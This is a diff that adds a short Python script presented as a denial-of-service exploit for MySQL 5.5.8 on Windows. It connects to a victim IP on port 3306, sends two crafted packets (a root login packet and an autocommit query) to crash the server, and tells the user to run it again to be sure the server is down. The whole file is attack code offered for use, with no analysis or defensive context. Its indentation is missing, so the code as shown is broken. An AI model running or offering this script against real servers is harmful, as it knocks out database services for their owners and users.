@@ -1,0 +1,37 @@
+import socket, sys 
+
+print "\n" 
+print "----------------------------------------------------------------" 
+print "| MySQL 5.5.8 Null Ptr (windows)                                |" 
+print "| Level Smash the Stack                                         |" 
+print "----------------------------------------------------------------" 
+print "\n" 
+
+buf=("&\x00\x00\x01\x85\xa2\x03\x00\x00\x00\x00@\x93\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00root\x00\x00")
+
+buf2=("\x11\x00\x00\x00\x03set autocommit30")
+
+def usage(): 
+print "usage : ./mysql.py <victim_ip>" 
+print "example: ./mysql.py 192.168.1.22" 
+
+
+def main(): 
+if len(sys.argv) != 2: 
+usage() 
+sys.exit() 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+
+HOST = sys.argv[1] 
+PORT = int(3306) 
+s.connect((HOST,PORT)) 
+print "[*] Connect" 
+s.send(buf)
+print "[*] Payload 1 sent"
+s.send(buf2) 
+print "[*] Payload 2 sent\n", "[*] Run again to ensure it is down..\n" 
+s.close() 
+
+if __name__ == "__main__": 
+main() 
